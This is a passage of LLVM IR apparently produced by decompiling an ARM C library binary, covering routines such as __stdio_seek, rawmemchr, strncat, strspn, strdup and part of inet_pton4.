  %v0_19560 = load i32, i32* @r4, align 4
  %v1_19560 = inttoptr i32 %v0_19560 to i32*
  %v2_19560 = load i32, i32* %v1_19560, align 4
  %v1_19564 = or i32 %v2_19560, 8
  store i32 %v1_19564, i32* %r3.global-to-local, align 4
  %v3_19568 = sdiv i32 %v2_19560, 256
  store i32 %v3_19568, i32* %r2.global-to-local, align 4
  %v1_19570 = trunc i32 %v3_19568 to i8
  %v3_19570 = add i32 %v0_19560, 1
  %v4_19570 = inttoptr i32 %v3_19570 to i8*
  store i8 %v1_19570, i8* %v4_19570, align 1
  %v0_19574 = load i32, i32* %r3.global-to-local, align 4
  %v1_19574 = trunc i32 %v0_19574 to i8
  %v2_19574 = load i32, i32* @r4, align 4
  %v3_19574 = inttoptr i32 %v2_19574 to i8*
  store i8 %v1_19574, i8* %v3_19574, align 1
  %v2_19578 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19578, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1957c:                               ; preds = %dec_label_pc_19540
  %v1_1957c = and i32 %v3_19540, 64
  %v2_1957c = icmp eq i32 %v1_1957c, 0
  br i1 %v2_1957c, label %dec_label_pc_195ac, label %dec_label_pc_19584

dec_label_pc_19584:                               ; preds = %dec_label_pc_1957c
  %v0_19584 = call i32 @__stdio_wcommit()
  %v2_19588 = icmp eq i32 %v0_19584, 0
  br i1 %v2_19588, label %dec_label_pc_19590, label %dec_label_pc_19560

dec_label_pc_19590:                               ; preds = %dec_label_pc_19584
  %v0_19590 = load i32, i32* @r4, align 4
  %v1_19590 = inttoptr i32 %v0_19590 to i32*
  %v2_19590 = load i32, i32* %v1_19590, align 4
  store i32 %v2_19590, i32* %r3.global-to-local, align 4
  %v1_19594 = add i32 %v0_19590, 8
  %v2_19594 = inttoptr i32 %v1_19594 to i32*
  %v3_19594 = load i32, i32* %v2_19594, align 4
  store i32 %v3_19594, i32* %r2.global-to-local, align 4
  %v1_19598 = and i32 %v2_19590, -65
  store i32 %v1_19598, i32* %r3.global-to-local, align 4
  %v3_1959c = sdiv i32 %v2_19590, 256
  store i32 %v3_1959c, i32* %r1.global-to-local, align 4
  %v2_195a0 = add i32 %v0_19590, 28
  %v3_195a0 = inttoptr i32 %v2_195a0 to i32*
  store i32 %v3_19594, i32* %v3_195a0, align 4
  %v0_195a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_195a4 = trunc i32 %v0_195a4 to i8
  %v2_195a4 = load i32, i32* @r4, align 4
  %v3_195a4 = add i32 %v2_195a4, 1
  %v4_195a4 = inttoptr i32 %v3_195a4 to i8*
  store i8 %v1_195a4, i8* %v4_195a4, align 1
  %v0_195a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_195a8 = trunc i32 %v0_195a8 to i8
  %v2_195a8 = load i32, i32* @r4, align 4
  %v3_195a8 = inttoptr i32 %v2_195a8 to i8*
  store i8 %v1_195a8, i8* %v3_195a8, align 1
  %v0_195ac.pre = load i32, i32* @r4, align 4
  %v0_195b8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_195ac

dec_label_pc_195ac:                               ; preds = %dec_label_pc_1957c, %dec_label_pc_19590
  %v0_195b8 = phi i32 [ 0, %dec_label_pc_1957c ], [ %v0_195b8.pre, %dec_label_pc_19590 ]
  %v2_195bc = phi i32 [ %v0_19540, %dec_label_pc_1957c ], [ %v0_195ac.pre, %dec_label_pc_19590 ]
  %v1_195ac = inttoptr i32 %v2_195bc to i32*
  %v2_195ac = load i32, i32* %v1_195ac, align 4
  %v1_195b0 = or i32 %v2_195ac, 1
  store i32 %v1_195b0, i32* %r3.global-to-local, align 4
  %v3_195b4 = sdiv i32 %v2_195ac, 256
  store i32 %v3_195b4, i32* %r2.global-to-local, align 4
  %v1_195bc = trunc i32 %v3_195b4 to i8
  %v3_195bc = add i32 %v2_195bc, 1
  %v4_195bc = inttoptr i32 %v3_195bc to i8*
  store i8 %v1_195bc, i8* %v4_195bc, align 1
  %v0_195c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_195c0 = trunc i32 %v0_195c0 to i8
  %v2_195c0 = load i32, i32* @r4, align 4
  %v3_195c0 = inttoptr i32 %v2_195c0 to i8*
  store i8 %v1_195c0, i8* %v3_195c0, align 1
  %v2_195c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_195c4, i32* @r4, align 4
  ret i32 %v0_195b8

; uselistorder directives
  uselistorder i32 %v3_195b4, { 1, 0 }
  uselistorder i32 %v3_19568, { 1, 0 }
  uselistorder i32 %v3_19540, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19540, { 0, 2, 1 }
  uselistorder i32 %v3_19534, { 1, 0 }
  uselistorder i32 %v5_19518, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_195ac, { 1, 0 }
  uselistorder label %dec_label_pc_19554, { 1, 0 }
  uselistorder label %dec_label_pc_19540, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_195cc = load i32, i32* @r4, align 4
  %v6_195cc = load i32, i32* @lr, align 4
  %v1_195d0 = add i32 %arg1, 4
  %v2_195d0 = inttoptr i32 %v1_195d0 to i32*
  %v3_195d0 = load i32, i32* %v2_195d0, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_195d8 = load i32, i32* %arg2, align 4
  %v3_195d8 = add i32 %tmp, 4
  %v4_195d8 = inttoptr i32 %v3_195d8 to i32*
  %v5_195d8 = load i32, i32* %v4_195d8, align 4
  %v6_195dc = call i32 @__libc_lseek64(i32 %v3_195d0, i32 %v2_195d8, i32 %v5_195d8, i32 %arg3, i32 %v3_195cc, i32 %v6_195cc)
  %v1_195e0 = icmp slt i32 %v2_195d8, 0
  %v6_195dc. = select i1 %v1_195e0, i32 %v6_195dc, i32 0
  store i32 %v6_195dc., i32* %r3.global-to-local, align 4
  br i1 %v1_195e0, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_195ec = load i32, i32* @r4, align 4
  %v4_195ec = inttoptr i32 %v3_195ec to i32*
  store i32 %v6_195dc, i32* %v4_195ec, align 4
  %v6_195ec = add i32 %v3_195ec, 4
  %v7_195ec = inttoptr i32 %v6_195ec to i32*
  store i32 %v2_195d8, i32* %v7_195ec, align 4
  %v0_195f0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_195f0 = phi i32 [ %v6_195dc, %entry ], [ %v0_195f0.pre, %bb ]
  ret i32 %v0_195f0

; uselistorder directives
  uselistorder i32 %v6_195dc, { 0, 2, 1 }
  uselistorder i32 %v2_195d8, { 1, 2, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1961c:
  %v1_195fc = urem i32 %arg1, 256
  store i32 %v1_195fc, i32* @lr, align 4
  %v4_1961c = mul nuw nsw i32 %v1_195fc, 256
  %v5_1961c = or i32 %v4_1961c, %v1_195fc
  %v4_19624 = mul i32 %v5_1961c, 65536
  %v5_19624 = or i32 %v4_19624, %v5_1961c
  %v0_19628.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_19628

dec_label_pc_19628:                               ; preds = %dec_label_pc_19694, %dec_label_pc_19628, %dec_label_pc_1961c
  %v0_19628 = phi i32 [ %v0_19628.pre, %dec_label_pc_1961c ], [ %v4_19628, %dec_label_pc_19628 ], [ %v4_19628, %dec_label_pc_19694 ]
  %v1_19628 = inttoptr i32 %v0_19628 to i32*
  %v2_19628 = load i32, i32* %v1_19628, align 4
  %v4_19628 = add i32 %v0_19628, 4
  store i32 %v4_19628, i32* @ip, align 4
  %v2_19630 = xor i32 %v2_19628, %v5_19624
  %v2_19634 = add i32 %v2_19630, 2130640639
  %v1_1963c = sub i32 -1, %v2_19630
  %v2_19640 = xor i32 %v2_19634, %v1_1963c
  %v2_19644 = and i32 %v2_19640, -2130640640
  %v2_19648 = icmp eq i32 %v2_19644, 0
  br i1 %v2_19648, label %dec_label_pc_19628, label %dec_label_pc_19650

dec_label_pc_19650:                               ; preds = %dec_label_pc_19628
  %v2_19650 = inttoptr i32 %v0_19628 to i8*
  %v3_19650 = load i8, i8* %v2_19650, align 1
  %v4_19650 = zext i8 %v3_19650 to i32
  %v9_19658 = icmp eq i32 %v4_19650, %v1_195fc
  store i1 %v9_19658, i1* @cpsr_z, align 1
  %v1_1965c = add i32 %v0_19628, 3
  %v1_19660 = add i32 %v0_19628, 1
  store i32 %v1_19660, i32* @r2, align 4
  %v1_19664 = add i32 %v0_19628, 2
  br i1 %v9_19658, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_19650
  ret i32 %v0_19628

bb18:                                             ; preds = %dec_label_pc_19650
  %v2_1966c = inttoptr i32 %v1_19660 to i8*
  %v3_1966c = load i8, i8* %v2_1966c, align 1
  %v4_1966c = zext i8 %v3_1966c to i32
  %v9_19670 = icmp eq i32 %v4_1966c, %v1_195fc
  store i1 %v9_19670, i1* @cpsr_z, align 1
  br i1 %v9_19670, label %dec_label_pc_19678, label %dec_label_pc_19680

dec_label_pc_19678:                               ; preds = %bb18
  ret i32 %v1_19660

dec_label_pc_19680:                               ; preds = %bb18
  %v2_19680 = inttoptr i32 %v1_19664 to i8*
  %v3_19680 = load i8, i8* %v2_19680, align 1
  %v4_19680 = zext i8 %v3_19680 to i32
  %v9_19684 = icmp eq i32 %v4_19680, %v1_195fc
  store i1 %v9_19684, i1* @cpsr_z, align 1
  br i1 %v9_19684, label %dec_label_pc_1968c, label %dec_label_pc_19694

dec_label_pc_1968c:                               ; preds = %dec_label_pc_19680
  ret i32 %v1_19664

dec_label_pc_19694:                               ; preds = %dec_label_pc_19680
  %v2_19694 = inttoptr i32 %v1_1965c to i8*
  %v3_19694 = load i8, i8* %v2_19694, align 1
  %v4_19694 = zext i8 %v3_19694 to i32
  %v9_19698 = icmp eq i32 %v4_19694, %v1_195fc
  store i1 %v9_19698, i1* @cpsr_z, align 1
  br i1 %v9_19698, label %dec_label_pc_196a0, label %dec_label_pc_19628

dec_label_pc_196a0:                               ; preds = %dec_label_pc_19694
  ret i32 %v1_1965c

; uselistorder directives
  uselistorder i32 %v4_19628, { 2, 1, 0 }
  uselistorder i32 %v0_19628, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1961c, { 1, 0 }
  uselistorder i32 %v1_195fc, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i1* @cpsr_z, { 8, 9, 10, 11, 1, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 0, 2, 3, 14, 4, 5, 6, 7, 23 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 4, 0, 1, 2, 3 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_196b0 = load i32, i32* @r4, align 4
  store i32 %v3_196b0, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_196bc

dec_label_pc_196bc:                               ; preds = %dec_label_pc_196bc, %entry
  %v0_196bc = phi i32 [ %v5_196bc, %dec_label_pc_196bc ], [ %tmp, %entry ]
  %v1_196bc = inttoptr i32 %v0_196bc to i8*
  %v2_196bc = load i8, i8* %v1_196bc, align 1
  %v3_196bc = zext i8 %v2_196bc to i32
  store i32 %v3_196bc, i32* %ip.global-to-local, align 4
  %v5_196bc = add i32 %v0_196bc, 1
  store i32 %v5_196bc, i32* %r3.global-to-local, align 4
  %v2_196c0 = icmp eq i8 %v2_196bc, 0
  store i1 %v2_196c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196c0, label %dec_label_pc_196c8, label %dec_label_pc_196bc

dec_label_pc_196c8:                               ; preds = %dec_label_pc_196bc
  %v0_196c8 = load i32, i32* %r2.global-to-local, align 4
  %v7_196c8 = icmp eq i32 %v0_196c8, 3
  store i1 %v7_196c8, i1* %cpsr_z.global-to-local, align 1
  %v1_196cc = add i32 %v0_196bc, -1
  store i32 %v1_196cc, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_196c8, 4
  br i1 %tmp10, label %dec_label_pc_19760thread-pre-split, label %dec_label_pc_196d4

dec_label_pc_196d4:                               ; preds = %dec_label_pc_196c8
  %v3_196d4 = udiv i32 %v0_196c8, 4
  store i32 %v3_196d4, i32* %r0.global-to-local, align 4
  %v0_196d8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_196d8

dec_label_pc_196d8:                               ; preds = %dec_label_pc_19738, %dec_label_pc_196d4
  %v2_196e0 = phi i32 [ %v1_19730, %dec_label_pc_19738 ], [ %v1_196cc, %dec_label_pc_196d4 ]
  %v0_196d8 = phi i32 [ %v1_1972c, %dec_label_pc_19738 ], [ %v0_196d8.pre, %dec_label_pc_196d4 ]
  %v1_196d8 = inttoptr i32 %v0_196d8 to i8*
  %v2_196d8 = load i8, i8* %v1_196d8, align 1
  %v3_196d8 = zext i8 %v2_196d8 to i32
  store i32 %v3_196d8, i32* %r3.global-to-local, align 4
  %v2_196dc = icmp eq i8 %v2_196d8, 0
  store i1 %v2_196dc, i1* %cpsr_z.global-to-local, align 1
  %v3_196e0 = add i32 %v2_196e0, 1
  %v4_196e0 = inttoptr i32 %v3_196e0 to i8*
  store i8 %v2_196d8, i8* %v4_196e0, align 1
  %v0_196e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_196e4 = add i32 %v0_196e4, 1
  store i32 %v1_196e4, i32* %ip.global-to-local, align 4
  %v0_196e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_196e8, label %.loopexit, label %dec_label_pc_196ec

dec_label_pc_196ec:                               ; preds = %dec_label_pc_196d8
  %v0_196ec = load i32, i32* @r1, align 4
  %v1_196ec = add i32 %v0_196ec, 1
  %v2_196ec = inttoptr i32 %v1_196ec to i8*
  %v3_196ec = load i8, i8* %v2_196ec, align 1
  %v4_196ec = zext i8 %v3_196ec to i32
  store i32 %v4_196ec, i32* %r3.global-to-local, align 4
  %v2_196f0 = icmp eq i8 %v3_196ec, 0
  store i1 %v2_196f0, i1* %cpsr_z.global-to-local, align 1
  %v3_196f4 = add i32 %v0_196e4, 2
  %v4_196f4 = inttoptr i32 %v3_196f4 to i8*
  store i8 %v3_196ec, i8* %v4_196f4, align 1
  %v0_196f8 = load i32, i32* @r1, align 4
  %v1_196f8 = add i32 %v0_196f8, 1
  store i32 %v1_196f8, i32* %r1.global-to-local, align 4
  %v0_196fc = load i32, i32* %ip.global-to-local, align 4
  %v1_196fc = add i32 %v0_196fc, 1
  store i32 %v1_196fc, i32* %ip.global-to-local, align 4
  %v0_19700 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19700, label %.loopexit, label %dec_label_pc_19704

dec_label_pc_19704:                               ; preds = %dec_label_pc_196ec
  %v1_19704 = add i32 %v0_196f8, 2
  %v2_19704 = inttoptr i32 %v1_19704 to i8*
  %v3_19704 = load i8, i8* %v2_19704, align 1
  %v4_19704 = zext i8 %v3_19704 to i32
  store i32 %v4_19704, i32* %r3.global-to-local, align 4
  %v2_19708 = icmp eq i8 %v3_19704, 0
  store i1 %v2_19708, i1* %cpsr_z.global-to-local, align 1
  %v3_1970c = add i32 %v0_196fc, 2
  %v4_1970c = inttoptr i32 %v3_1970c to i8*
  store i8 %v3_19704, i8* %v4_1970c, align 1
  %v0_19710 = load i32, i32* %r1.global-to-local, align 4
  %v1_19710 = add i32 %v0_19710, 1
  store i32 %v1_19710, i32* %r1.global-to-local, align 4
  %v0_19714 = load i32, i32* %ip.global-to-local, align 4
  %v1_19714 = add i32 %v0_19714, 1
  store i32 %v1_19714, i32* %lr.global-to-local, align 4
  %v0_19718 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19718, label %.loopexit, label %dec_label_pc_1971c

dec_label_pc_1971c:                               ; preds = %dec_label_pc_19704
  %v1_1971c = add i32 %v0_19710, 2
  %v2_1971c = inttoptr i32 %v1_1971c to i8*
  %v3_1971c = load i8, i8* %v2_1971c, align 1
  %v4_1971c = zext i8 %v3_1971c to i32
  store i32 %v4_1971c, i32* %ip.global-to-local, align 4
  store i32 %v1_1971c, i32* %r3.global-to-local, align 4
  %v2_19724 = icmp eq i8 %v3_1971c, 0
  store i1 %v2_19724, i1* %cpsr_z.global-to-local, align 1
  %v3_19728 = add i32 %v0_19714, 2
  %v4_19728 = inttoptr i32 %v3_19728 to i8*
  store i8 %v3_1971c, i8* %v4_19728, align 1
  %v0_1972c = load i32, i32* %r3.global-to-local, align 4
  %v1_1972c = add i32 %v0_1972c, 1
  store i32 %v1_1972c, i32* @r1, align 4
  %v0_19730 = load i32, i32* %lr.global-to-local, align 4
  %v1_19730 = add i32 %v0_19730, 1
  store i32 %v1_19730, i32* %lr.global-to-local, align 4
  %v0_19734 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19734, label %.loopexit, label %dec_label_pc_19738

dec_label_pc_19738:                               ; preds = %dec_label_pc_1971c
  %v0_19738 = load i32, i32* %r0.global-to-local, align 4
  %v1_19738 = add i32 %v0_19738, -1
  store i32 %v1_19738, i32* %r0.global-to-local, align 4
  %v7_19738 = icmp eq i32 %v0_19738, 1
  store i1 %v7_19738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19738, label %dec_label_pc_19740, label %dec_label_pc_196d8

dec_label_pc_19740:                               ; preds = %dec_label_pc_19738
  %v0_19740 = load i32, i32* %r2.global-to-local, align 4
  %v1_19740 = urem i32 %v0_19740, 4
  store i32 %v1_19740, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19760

dec_label_pc_19748:                               ; preds = %dec_label_pc_19760
  %v0_19748 = load i32, i32* @r1, align 4
  %v1_19748 = inttoptr i32 %v0_19748 to i8*
  %v2_19748 = load i8, i8* %v1_19748, align 1
  %v3_19748 = zext i8 %v2_19748 to i32
  store i32 %v3_19748, i32* %ip.global-to-local, align 4
  %v2_1974c = icmp eq i8 %v2_19748, 0
  store i1 %v2_1974c, i1* %cpsr_z.global-to-local, align 1
  %v1_19750 = add i32 %v1_1976c, -1
  store i32 %v1_19750, i32* %r2.global-to-local, align 4
  %v3_19754 = add i32 %v3_1976c, 1
  %v4_19754 = inttoptr i32 %v3_19754 to i8*
  store i8 %v2_19748, i8* %v4_19754, align 1
  %v5_19754 = load i32, i32* %lr.global-to-local, align 4
  %v6_19754 = add i32 %v5_19754, 1
  store i32 %v6_19754, i32* %lr.global-to-local, align 4
  %v0_19758 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19758, label %.loopexit, label %dec_label_pc_1975c

dec_label_pc_1975c:                               ; preds = %dec_label_pc_19748
  %v0_1975c = load i32, i32* @r1, align 4
  %v1_1975c = add i32 %v0_1975c, 1
  store i32 %v1_1975c, i32* @r1, align 4
  %v0_19760.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19760thread-pre-split

dec_label_pc_19760thread-pre-split:               ; preds = %dec_label_pc_1975c, %dec_label_pc_196c8
  %v2_197546 = phi i32 [ %v6_19754, %dec_label_pc_1975c ], [ %v1_196cc, %dec_label_pc_196c8 ]
  %v0_19760.pr = phi i32 [ %v0_19760.pr.pre, %dec_label_pc_1975c ], [ %v0_196c8, %dec_label_pc_196c8 ]
  br label %dec_label_pc_19760

dec_label_pc_19760:                               ; preds = %dec_label_pc_19760thread-pre-split, %dec_label_pc_19740
  %v3_1976c = phi i32 [ %v2_197546, %dec_label_pc_19760thread-pre-split ], [ %v1_19730, %dec_label_pc_19740 ]
  %v1_1976c = phi i32 [ %v0_19760.pr, %dec_label_pc_19760thread-pre-split ], [ %v1_19740, %dec_label_pc_19740 ]
  %v2_19760 = icmp eq i32 %v1_1976c, 0
  store i1 %v2_19760, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19760, label %dec_label_pc_19768, label %dec_label_pc_19748

dec_label_pc_19768:                               ; preds = %dec_label_pc_19760
  %v0_19768 = load i32, i32* %ip.global-to-local, align 4
  %v2_19768 = icmp eq i32 %v0_19768, 0
  store i1 %v2_19768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19768, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_19768
  %v4_1976c = add i32 %v3_1976c, 1
  %v5_1976c = inttoptr i32 %v4_1976c to i8*
  store i8 0, i8* %v5_1976c, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_1971c, %dec_label_pc_19704, %dec_label_pc_196ec, %dec_label_pc_196d8, %dec_label_pc_19748, %dec_label_pc_19768, %bb
  %v0_19770 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19770, i32* %r0.global-to-local, align 4
  %v2_19774 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19774, i32* @r4, align 4
  ret i32 %v0_19770

; uselistorder directives
  uselistorder i32 %v1_1976c, { 1, 0 }
  uselistorder i32 %v1_19740, { 1, 0 }
  uselistorder i32 %v0_19738, { 1, 0 }
  uselistorder i32 %v1_19730, { 0, 2, 1 }
  uselistorder i32 %v1_1972c, { 1, 0 }
  uselistorder i32 %v0_196c8, { 2, 1, 0, 3 }
  uselistorder i32 %v5_196bc, { 1, 0 }
  uselistorder i32 %v0_196bc, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_197b02 = load i32, i32* @r0, align 4
  %v1_197b03 = inttoptr i32 %v0_197b02 to i8*
  %v2_197b04 = load i8, i8* %v1_197b03, align 1
  %v3_197b05 = zext i8 %v2_197b04 to i32
  store i32 %v3_197b05, i32* @r2, align 4
  %v2_197b46 = icmp eq i8 %v2_197b04, 0
  br i1 %v2_197b46, label %dec_label_pc_197c0, label %dec_label_pc_1978c.preheader

dec_label_pc_19784:                               ; preds = %dec_label_pc_1978c
  %v1_19794 = add i32 %v0_19794, 1
  %v9_19784 = icmp eq i32 %v0_197a0, %v3_1978c
  br i1 %v9_19784, label %dec_label_pc_197a0, label %dec_label_pc_1978c

dec_label_pc_1978c:                               ; preds = %dec_label_pc_1978c.preheader, %dec_label_pc_19784
  %v0_19794 = phi i32 [ %tmp, %dec_label_pc_1978c.preheader ], [ %v1_19794, %dec_label_pc_19784 ]
  %v1_1978c = inttoptr i32 %v0_19794 to i8*
  %v2_1978c = load i8, i8* %v1_1978c, align 1
  %v3_1978c = zext i8 %v2_1978c to i32
  store i32 %v3_1978c, i32* @ip, align 4
  %v2_19790 = icmp eq i8 %v2_1978c, 0
  br i1 %v2_19790, label %dec_label_pc_197c0, label %dec_label_pc_19784

dec_label_pc_197a0:                               ; preds = %dec_label_pc_19784
  %v2_197a0 = icmp eq i32 %v0_197a0, 0
  br i1 %v2_197a0, label %dec_label_pc_197c0, label %dec_label_pc_197a8

dec_label_pc_197a8:                               ; preds = %dec_label_pc_197a0
  %v1_197a8 = add i32 %v0_197a8, 1
  store i32 %v1_197a8, i32* @lr, align 4
  %v1_197ac = add i32 %v0_197ac, 1
  %v1_197b0 = inttoptr i32 %v1_197ac to i8*
  %v2_197b0 = load i8, i8* %v1_197b0, align 1
  %v3_197b0 = zext i8 %v2_197b0 to i32
  store i32 %v3_197b0, i32* @r2, align 4
  %v2_197b4 = icmp eq i8 %v2_197b0, 0
  br i1 %v2_197b4, label %dec_label_pc_197c0, label %dec_label_pc_1978c.preheader

dec_label_pc_1978c.preheader:                     ; preds = %entry, %dec_label_pc_197a8
  %v0_197ac = phi i32 [ %v1_197ac, %dec_label_pc_197a8 ], [ %v0_197b02, %entry ]
  %v0_197a8 = phi i32 [ %v1_197a8, %dec_label_pc_197a8 ], [ 0, %entry ]
  %v0_197a0 = phi i32 [ %v3_197b0, %dec_label_pc_197a8 ], [ %v3_197b05, %entry ]
  br label %dec_label_pc_1978c

dec_label_pc_197c0:                               ; preds = %dec_label_pc_197a0, %dec_label_pc_197a8, %dec_label_pc_1978c, %entry
  %v0_197c0 = phi i32 [ 0, %entry ], [ %v0_197a8, %dec_label_pc_1978c ], [ %v1_197a8, %dec_label_pc_197a8 ], [ %v0_197a8, %dec_label_pc_197a0 ]
  ret i32 %v0_197c0

; uselistorder directives
  uselistorder i32 %v3_1978c, { 1, 0 }
  uselistorder i32 %v0_19794, { 1, 0 }
  uselistorder i32* @ip, { 18, 19, 3, 20, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 10, 11, 0, 12, 13, 14, 15, 16, 31, 32, 5, 33, 4, 34, 7, 6, 22, 23, 8, 25, 26, 2, 27, 28, 24, 29, 85, 82, 83, 84, 1, 86, 9, 17, 21, 30, 37, 36, 35, 38, 39 }
  uselistorder label %dec_label_pc_197c0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1978c.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_197c8 = load i32, i32* @r4, align 4
  store i32 %v3_197c8, i32* %stack_var_-12, align 4
  %v6_197c8 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_197d0 = call i32 @strlen(i8* %arg1)
  %v1_197d4 = add i32 %v3_197d0, 1
  store i32 %v1_197d4, i32* @r4, align 4
  %v1_197dc = call i32 @malloc(i32 %v1_197d4)
  store i32 104432, i32* @lr, align 4
  %v1_197ec = icmp ne i32 %v1_197dc, 0
  call void @__pseudo_cond_branch(i1 %v1_197ec, i32 ptrtoint ([3 x i8]* @global_var_14940.1068 to i32))
  %v2_197f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_197f4, i32* @r4, align 4
  store i32 %v6_197c8, i32* @r5, align 4
  ret i32 %v1_197dc

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 9, 10, 11, 8, 15, 13, 14, 12, 6, 2, 3, 0, 7, 1, 5 }
  uselistorder i32 (i32)* @malloc, { 8, 5, 4, 14, 15, 7, 6, 13, 12, 11, 10, 9, 3, 2, 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_197f8 = load i32, i32* @r5, align 4
  %v2_19800 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_19800, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_198883 = load i8, i8* %arg1, align 1
  %v3_198884 = zext i8 %v2_198883 to i32
  %v5_198885 = add i32 %tmp, 1
  store i32 %v5_198885, i32* @r4, align 4
  %v2_1988c6 = icmp eq i8 %v2_198883, 0
  store i1 %v2_1988c6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1988c6, label %dec_label_pc_19898, label %dec_label_pc_19820

dec_label_pc_19820:                               ; preds = %entry, %dec_label_pc_19888.backedge
  %v0_19864 = phi i32 [ %v3_19888, %dec_label_pc_19888.backedge ], [ %v3_198884, %entry ]
  %v1_1989010.in = phi i32 [ %v3_19888, %dec_label_pc_19888.backedge ], [ %v3_198884, %entry ]
  %v1_1989010 = add nsw i32 %v1_1989010.in, -48
  %v2_19820 = icmp ugt i32 %v1_1989010, 8
  %v7_19820 = icmp eq i32 %v1_1989010, 9
  store i1 %v7_19820, i1* %cpsr_z.global-to-local, align 1
